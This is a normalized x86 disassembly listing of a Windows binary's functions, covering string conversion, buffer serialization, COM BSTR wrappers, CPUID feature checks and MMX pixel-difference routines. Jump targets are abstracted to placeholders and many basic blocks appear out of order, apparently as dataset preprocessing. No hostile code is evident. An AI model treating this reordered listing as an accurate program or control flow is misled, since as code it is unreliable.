mov ecx edi
call sub_401160
pop edi
add eax 0x4
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
sub_402550
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_42f1de
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov ecx rw-data
mov [ rw-data ] eax
call sub_401ff0
push sub_433e60
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_4025c0
sub esp 0x8
push esi
mov esi [ ecx ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
add esp 0x8
retn 0x8
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ecx
call sub_402550
cmp [ eax ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push esi
call [ eax + 0x14 ]
pop esi
add esp 0x8
retn 0x8
xor eax eax
pop esi
add esp 0x8
retn 0x8
sub_402610
sub esp 0x8
push esi
mov esi [ ecx ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
add esp 0x8
retn 0x8
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ecx
call sub_402550
cmp [ eax ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push esi
call [ eax + 0x18 ]
pop esi
add esp 0x8
retn 0x8
xor eax eax
pop esi
add esp 0x8
retn 0x8
sub_402660
sub esp 0x8
push ebx
mov ebx [ esp + 0x18 ]
push esi
xor esi esi
test ebx ebx
jbe r-xdata
mov eax esi
pop esi
pop ebx
add esp 0x8
retn 0xc
push ebp
mov ebp [ esp + 0x1c ]
push edi
pop edi
pop ebp
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
lea eax [ esi + ebp ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] eax
call sub_402550
cmp [ eax ] 0x0
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push edi
call [ eax + 0x18 ]
test eax eax
jle r-xdata
add esi eax
sub ebx eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov edi [ eax ]
test edi edi
je r-xdata
sub_4026c0
sub esp 0x8
push esi
mov esi [ esp + 0x18 ]
push edi
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
add esp 0x8
retn 0xc
push ebp
mov ebp [ esp + 0x1c ]
push ebx
pop ebx
pop ebp
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
lea eax [ edi + ebp ]
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] eax
call sub_402550
cmp [ eax ] 0x0
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push ebx
call [ eax + 0x14 ]
test eax eax
jl r-xdata
xor eax eax
jmp r-xdata
sub esi eax
add edi eax
test esi esi
jg r-xdata
mov eax [ esp + 0x1c ]
mov ebx [ eax ]
test ebx ebx
je r-xdata
sub_402720
push 0xffffffff
push sub_42f210
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14c
mov eax [ rw-data ]
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x4 ]
push edi
mov edi [ esi ]
mov ecx [ edi + 0x4 ]
mov [ esp + 0x154 ] eax
lea eax [ ebx + 0x1 ]
cmp eax ecx
jbe r-xdata
mov eax [ edi ]
mov ebx [ ebx + eax ]
push 0x4
lea ecx [ esp + 0x14 ]
push ecx
mov ecx esi
call sub_4022b0
cmp esi eax
je r-xdata
push eax
mov ecx edi
call sub_401160
test ebx ebx
je r-xdata
mov edx [ eax ]
mov [ esi ] edx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ esp + 0x158 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x14c ]
pop ebx
call sub_42e72f
add esp 0x158
retn 0x4
mov edi [ esi + 0x4 ]
push ebp
mov ebp [ esi ]
mov ecx [ ebp + 0x4 ]
add edi ebx
lea eax [ edi + 0x1 ]
cmp eax ecx
jbe r-xdata
mov ecx [ ebp ]
mov dl [ edi + ecx ]
mov edi [ esi + 0x4 ]
mov ebp [ esi ]
mov ecx [ ebp + 0x4 ]
add edi ebx
lea eax [ edi + 0x1 ]
cmp eax ecx
mov [ esp + 0x13 ] dl
jbe r-xdata
push eax
mov ecx ebp
call sub_401160
mov eax [ ebp ]
mov [ edi + eax ] 0x0
mov ebp [ esi + 0x4 ]
mov edi [ esi ]
mov ecx [ edi + 0x4 ]
lea eax [ ebp + 0x1 ]
cmp eax ecx
jbe r-xdata
push eax
mov ecx ebp
call sub_401160
mov ecx [ edi ]
add ecx ebp
push ecx
lea ecx [ esp + 0x140 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x164 ] 0x0
lea ecx [ esp + 0x13c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
lea edx [ esp + 0x3c ]
mov edi eax
mov [ esp + 0x38 ] edx
call [ rw-data ]
push eax
push edi
lea ecx [ esp + 0x40 ]
call sub_401de0
mov [ esp + 0x164 ] 0x1
mov eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x164 ] 0x2
mov ecx [ esp + 0x16c ]
push eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov [ esp + 0x164 ] 0x1
lea ecx [ esp + 0x1c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x164 ] 0x0
mov eax [ esp + 0x38 ]
lea ecx [ esp + 0x3c ]
cmp eax ecx
je r-xdata
push eax
mov ecx edi
call sub_401160
mov edi [ esi + 0x4 ]
mov ebp [ esi ]
mov ecx [ ebp + 0x4 ]
add edi ebx
lea eax [ edi + 0x1 ]
cmp eax ecx
jbe r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov edx [ ebp ]
mov al [ esp + 0x13 ]
push ebx
lea ecx [ esp + 0x18 ]
push ecx
mov ecx esi
mov [ edi + edx ] al
call sub_4022b0
cmp esi eax
pop ebp
je r-xdata
push eax
mov ecx ebp
call sub_401160
mov [ esp + 0x160 ] 0xffffffff
lea ecx [ esp + 0x138 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edx [ eax ]
mov [ esi ] edx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
sub_402910
push 0xffffffff
push sub_42f237
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xac
mov eax [ rw-data ]
push ebx
push ebp
mov ebx ecx
mov ecx [ esp + 0xc4 ]
push esi
mov [ esp + 0xb4 ] eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov esi eax
lea eax [ esp + 0x34 ]
mov [ esp + 0x30 ] eax
call [ rw-data ]
push eax
push esi
lea ecx [ esp + 0x38 ]
call sub_401e50
mov [ esp + 0xc0 ] 0x0
mov ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xc0 ] 0x2
mov eax [ esp + 0x30 ]
lea edx [ esp + 0x34 ]
cmp eax edx
je r-xdata
mov ebp [ esp + 0x28 ]
lea eax [ esp + 0xc ]
push eax
mov ecx ebx
mov [ esp + 0x10 ] ebp
call sub_4024f0
test ebp ebp
je r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov [ esp + 0xc0 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0xb8 ]
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0xac ]
pop ebx
call sub_42e72f
add esp 0xb8
retn 0x4
push edi
push ebp
lea ecx [ esp + 0x14 ]
push ecx
mov ecx ebx
call sub_4022b0
mov esi [ ebx + 0x4 ]
mov edi [ ebx ]
mov ecx [ edi + 0x4 ]
lea eax [ esi + 0x1 ]
cmp eax ecx
jbe r-xdata
mov edi [ edi ]
lea ecx [ esp + 0x18 ]
add edi esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
mov esi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebx + 0x8 ]
add edx ebp
lea eax [ esp + 0x10 ]
cmp ebx eax
mov [ ebx + 0x8 ] edx
pop edi
je r-xdata
push eax
mov ecx edi
call sub_401160
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] edx
sub_402a60
push 0xffffffff
push sub_42f258
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push ebp
push esi
mov esi [ esp + 0x38 ]
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax 0xc
push edi
mov ebp ecx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x1c ] ebx
jae r-xdata
mov eax [ esi ]
push 0xc
push eax
mov eax [ esp + 0x40 ]
push eax
mov ecx ebp
call sub_402660
mov edi eax
cmp edi 0xc
jb r-xdata
push 0xc
mov ecx esi
call sub_401ee0
mov ecx [ esp + 0x28 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x24
retn 0x8
mov [ esp + 0x30 ] 0xffffffff
lea ecx [ esp + 0x14 ]
push ecx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call sub_402310
lea edx [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x20 ]
call sub_402310
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x20 ]
call sub_402360
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x3c ]
cmp eax ecx
jbe r-xdata
cmp ecx 0x20
ja r-xdata
lea ebx [ eax - 0x4 ]
cmp ebx [ esi + 0x4 ]
jbe r-xdata
mov edx [ esi ]
mov eax [ esp + 0x38 ]
push ebx
add edx edi
push edx
push eax
mov ecx ebp
call sub_402660
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
add esp 0x24
retn 0x8
lea ecx [ edi + ebx ]
push ecx
mov ecx esi
call sub_401ee0
sub_402b60
push 0xffffffff
push sub_42f278
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ esp + 0x28 ]
push esi
lea ecx [ esp + 0x8 ]
push ecx
push 0x1
lea edx [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
call sub_402150
mov ecx eax
call sub_402170
mov [ esp + 0x24 ] 0xffffffff
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov esi [ esp + 0x30 ]
mov [ esp + 0x14 ] ecx
push esi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] 0x0
call sub_402720
lea edx [ esi + 0x1c ]
push edx
lea ecx [ esp + 0x14 ]
call sub_402720
push r--data
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::compare@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x24
retn 0x8
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push eax
lea ecx [ esp + 0x14 ]
call sub_402360
mov eax [ esi + 0x38 ]
add eax 0x4
push eax
lea ecx [ esp + 0x14 ]
call sub_402360
mov ecx [ esi + 0x38 ]
add ecx 0x8
push ecx
lea ecx [ esp + 0x14 ]
call sub_402360
mov edx [ esi + 0x38 ]
add edx 0xc
push edx
lea ecx [ esp + 0x14 ]
call sub_402360
mov eax [ esi + 0x38 ]
add eax 0x10
push eax
lea ecx [ esp + 0x14 ]
call sub_402360
mov ecx [ esi + 0x38 ]
add ecx 0x14
push ecx
lea ecx [ esp + 0x14 ]
call sub_402360
push rw-data
lea ecx [ esp + 0x14 ]
call sub_402360
push rw-data
lea ecx [ esp + 0x14 ]
call sub_402360
mov edx [ esi + 0x38 ]
add edx 0x18
push edx
lea ecx [ esp + 0x14 ]
call sub_402720
push rw-data
lea ecx [ esp + 0x14 ]
call sub_402410
mov eax [ esi + 0x38 ]
add eax 0x34
push eax
lea ecx [ esp + 0x14 ]
call sub_402720
sub_402cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_42f2a0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] ebx
lea ecx [ ebp - 0x58 ]
push ecx
push 0x1
lea edx [ ebp - 0x74 ]
push edx
lea ecx [ ebp - 0x50 ]
call sub_402150
mov ecx eax
call sub_402170
sub esp 0x8
mov [ ebp - 0x68 ] esp
mov eax esp
mov [ ebp - 0x64 ] eax
mov ecx [ ebp - 0x54 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x58 ]
mov [ eax ] edx
mov [ ebp - 0x4 ] bl
lea ecx [ ebp - 0x48 ]
call sub_402130
mov esi [ ebp + 0xc ]
push esi
lea ecx [ ebp - 0x48 ]
call sub_402910
lea eax [ esi + 0x1c ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_402910
push r--data
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::compare@IAT ]
test eax eax
jne r-xdata
push r--data
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::compare@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x38 ]
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x50 ]
call sub_4022f0
mov [ eax ] 0x10001
mov esi [ ebp - 0x40 ]
mov [ ebp - 0x60 ] esi
lea ecx [ ebp - 0x50 ]
call sub_4022f0
mov [ eax + 0x4 ] esi
mov [ ebp - 0x6c ] esi
lea eax [ esi + 0x8 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push r--data
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::compare@IAT ]
test eax eax
je r-xdata
push eax
lea ecx [ ebp - 0x48 ]
call sub_4023b0
mov ecx [ esi + 0x38 ]
add ecx 0x4
push ecx
lea ecx [ ebp - 0x48 ]
call sub_4023b0
mov edx [ esi + 0x38 ]
add edx 0x8
push edx
lea ecx [ ebp - 0x48 ]
call sub_4023b0
mov eax [ esi + 0x38 ]
add eax 0xc
push eax
lea ecx [ ebp - 0x48 ]
call sub_4023b0
mov ecx [ esi + 0x38 ]
add ecx 0x10
push ecx
lea ecx [ ebp - 0x48 ]
call sub_4023b0
mov edx [ esi + 0x38 ]
add edx 0x14
push edx
lea ecx [ ebp - 0x48 ]
call sub_4023b0
push rw-data
lea ecx [ ebp - 0x48 ]
call sub_4023b0
push rw-data
lea ecx [ ebp - 0x48 ]
call sub_4023b0
mov eax [ esi + 0x38 ]
add eax 0x18
push eax
lea ecx [ ebp - 0x48 ]
call sub_402910
push rw-data
lea ecx [ ebp - 0x48 ]
call sub_402460
mov ecx [ esi + 0x38 ]
add ecx 0x34
push ecx
lea ecx [ ebp - 0x48 ]
call sub_402910
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp - 0x14 ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push r--data
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::compare@IAT ]
sub_402ea0
push 0xffffffff
push sub_42f2b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push 0x200
mov esi ecx
mov [ esp + 0xc ] 0x200
call j_sub_42e3bc
add esp 0x4
mov [ esp + 0x4 ] eax
mov [ esp + 0x14 ] 0x0
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x4 ]
push eax
push ecx
mov ecx esi
call sub_402a60
test eax eax
jne r-xdata
mov edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
call sub_402b60
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
push eax
call ??_V@YAXPAX@Z
add esp 0x4
xor eax eax
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
push eax
call ??_V@YAXPAX@Z
add esp 0x4
sub_402f60
push 0xffffffff
push sub_42f2d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
push 0x200
mov edi ecx
mov [ esp + 0x10 ] 0x200
call j_sub_42e3bc
add esp 0x4
mov [ esp + 0x8 ] eax
mov [ esp + 0x18 ] 0x0
mov eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0xc ]
push ecx
mov ecx edi
call sub_402cc0
mov esi eax
test esi esi
je r-xdata
mov [ esp + 0x18 ] 0xffffffff
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x20 ]
push esi
push edx
push eax
mov ecx edi
call sub_4026c0
cmp esi eax
je r-xdata
pop edi
xor eax eax
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
push eax
call ??_V@YAXPAX@Z
add esp 0x4
mov [ esp + 0x18 ] 0xffffffff
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
pop edi
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
push eax
call ??_V@YAXPAX@Z
add esp 0x4
sub_403080
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
test edi edi
je r-xdata
push 0x8007000e
call sub_42cee0
sub_4030c0
mov al [ esp + 0x8 ]
test al al
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
je r-xdata
mov [ esi ] edi
test edi edi
je r-xdata
push edi
call [ SysStringByteLen@IAT ]
push eax
push edi
call [ SysAllocStringByteLen@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
pop edi
mov eax esi
pop esi
retn 0x8
push 0x8007000e
call sub_42cee0
pop edi
mov eax esi
pop esi
retn 0x8
sub_403140
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
call [ SysFreeString@IAT ]
pop esi
retn
push esi
call ??_V@YAXPAX@Z
add esp 0x4
sub_403180
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ esi ]
push ecx
push esi
call [ eax + 0x48 ]
test eax eax
jge r-xdata
pop esi
retn 0x4
push r--data
push esi
push eax
call sub_42cef0
sub_4031b0
push esi
push edi
mov edi ecx
mov eax [ edi ]
push edi
call [ eax + 0x70 ]
mov esi eax
test esi esi
jge r-xdata
pop edi
mov eax esi
pop esi
retn
push r--data
push edi
push esi
call sub_42cef0
sub_4031e0
push esi
push edi
mov edi ecx
mov eax [ edi ]
push edi
call [ eax + 0x74 ]
mov esi eax
test esi esi
jge r-xdata
pop edi
mov eax esi
pop esi
retn
push r--data
push edi
push esi
call sub_42cef0
sub_403210
push ecx
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ esp + 0x4 ]
push ecx
push esi
mov [ esp + 0xc ] 0x0
call [ eax + 0x90 ]
test eax eax
jge r-xdata
mov ax [ esp + 0x4 ]
pop esi
pop ecx
retn
push r--data
push esi
push eax
call sub_42cef0
sub_403250
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ esi ]
push ecx
push esi
call [ eax + 0xb4 ]
test eax eax
jge r-xdata
pop esi
retn 0x4
push r--data
push esi
push eax
call sub_42cef0
sub_403280
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ esi ]
push ecx
push esi
call [ eax + 0xd4 ]
test eax eax
jge r-xdata
pop esi
retn 0x4
push r--data
push esi
push eax
call sub_42cef0
sub_4032f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42f2f0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] eax
pushfd
pop eax
mov edx eax
mov [ ebp - 0x14 ] eax
xor eax 0x200000
push eax
popfd
pushfd
pop eax
mov [ ebp - 0x18 ] eax
push edx
popfd
xor eax eax
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
setne al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403370
push ebp
mov ebp esp
push 0xffffffff
push sub_42f300
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_4032f0
test al al
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
push ebx
mov eax 0x1
cpuid
mov [ ebp - 0x14 ] edx
pop ebx
mov eax [ ebp - 0x14 ]
and eax 0x800000
mov [ ebp - 0x14 ] eax
xor ecx ecx
cmp eax 0x800000
sete cl
mov al cl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4033f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42f310
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_4032f0
test al al
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
push ebx
mov eax 0x1
cpuid
mov [ ebp - 0x14 ] edx
pop ebx
mov eax [ ebp - 0x14 ]
and eax 0x2000000
mov [ ebp - 0x14 ] eax
xor ecx ecx
cmp eax 0x2000000
sete cl
mov al cl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403470
push ebp
mov ebp esp
push 0xffffffff
push sub_42f320
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
movups xmm0 xmm0
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4034d0
sub esp 0x8
mov edx [ esp + 0x14 ]
mov eax [ edx + 0x4 ]
test eax eax
mov [ esp + 0x4 ] 0x0
jle r-xdata
add esp 0x8
retn
mov eax [ edx ]
mov ecx [ esp + 0xc ]
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
mov edi [ esp + 0x14 ]
mov ebx [ edx + 0x4 ]
inc edi
cmp edi ebx
mov [ esp + 0x14 ] edi
jl r-xdata
mov edi edi
xor ebp ebp
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
mov al [ ecx ]
mov dl [ ecx + 0x1 ]
mov [ esp + 0x13 ] al
inc ecx
mov al [ ecx + 0x1 ]
mov [ esp + 0x10 ] al
mov al [ esi ]
mov bl [ esp + 0x10 ]
inc ecx
mov [ esp + 0x12 ] dl
mov dl [ esi + 0x1 ]
add ecx 0x2
inc esi
mov [ esp + 0x11 ] dl
mov dl [ esi + 0x1 ]
sub dl bl
mov bl [ esp + 0x12 ]
inc esi
movzx edi dl
mov dl [ esp + 0x11 ]
sub dl bl
movzx edx dl
add edi edx
sub al [ esp + 0x13 ]
movzx eax al
add edi eax
mov eax 0x55555556
imul edi
mov eax edx
shr eax 0x1f
add eax edx
or dl 0xff
sub dl al
mov eax [ esp + 0x24 ]
add esi 0x2
mov [ ecx - 0x1 ] dl
mov eax [ eax ]
inc ebp
cmp ebp eax
jl r-xdata
mov edx [ esp + 0x24 ]
sub_403590
sub esp 0x8
mov edx [ esp + 0x18 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ esp + 0x1c ]
mov ecx [ esi ]
cmp ecx eax
mov [ esp + 0x8 ] eax
jg r-xdata
mov ecx [ edx + 0xc ]
mov eax [ esi + 0x4 ]
cmp eax ecx
mov [ esp + 0xc ] ecx
jg r-xdata
mov [ esp + 0x8 ] ecx
mov ebx [ edx + 0x4 ]
cmp ebx [ esp + 0xc ]
jge r-xdata
mov [ esp + 0xc ] eax
pop esi
pop ebx
add esp 0x8
retn
mov esi [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x1c ]
push edi
mov eax [ esp + 0x14 ]
inc ebx
cmp ebx eax
jl r-xdata
jmp r-xdata
mov edi [ edx ]
cmp edi [ esp + 0x10 ]
jge r-xdata
pop edi
pop ebp
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
imul ecx ebx
add ecx edi
shl ecx 0x2
mov dl [ ecx + ebp + 0x1 ]
sub dl [ esi + ecx + 0x1 ]
mov al [ ecx + ebp + 0x2 ]
sub al [ esi + ecx + 0x2 ]
movzx edx dl
movzx eax al
add edx eax
mov al [ ecx + ebp ]
sub al [ ecx + esi ]
movzx eax al
add edx eax
mov eax 0x55555556
imul edx
mov eax edx
shr eax 0x1f
add eax edx
or dl 0xff
sub dl al
mov eax [ esp + 0x10 ]
inc edi
cmp edi eax
mov [ esi + ecx + 0x3 ] dl
jl r-xdata
mov edx [ esp + 0x28 ]
sub_403650
push ebp
mov ebp esp
sub esp 0x10
mov eax 0x2ab02ab
push esi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
mov esi [ eax + 0x4 ]
imul esi [ eax ]
push edi
mov edi esi
and edi 0xfffffffe
mov [ ebp - 0x8 ] 0x10001
mov [ ebp - 0x4 ] 0x1
mov [ ebp + 0x10 ] edi
jle r-xdata
cmp edi esi
jge r-xdata
mov ecx [ ebp + 0x10 ]
pcmpeqb mm6 mm6
pxor mm4 mm4
mov eax [ ebp + 0xc ]
movq mm7 mm6
movq mm2 [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
psrlw mm6 0xf
psrld mm7 0x8
lea eax [ eax + ecx * 4 ]
movq mmx0 [ ebp - 0x8 ]
lea edx [ edx + ecx * 4 ]
neg ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
sub ebx eax
lea ecx [ eax + edi * 4 ]
sub esi edi
lea esp [ esp ]
movq mm3 [ eax + ecx * 4 ]
movq mm5 [ edx + ecx * 4 ]
psubusb mm3 mm5
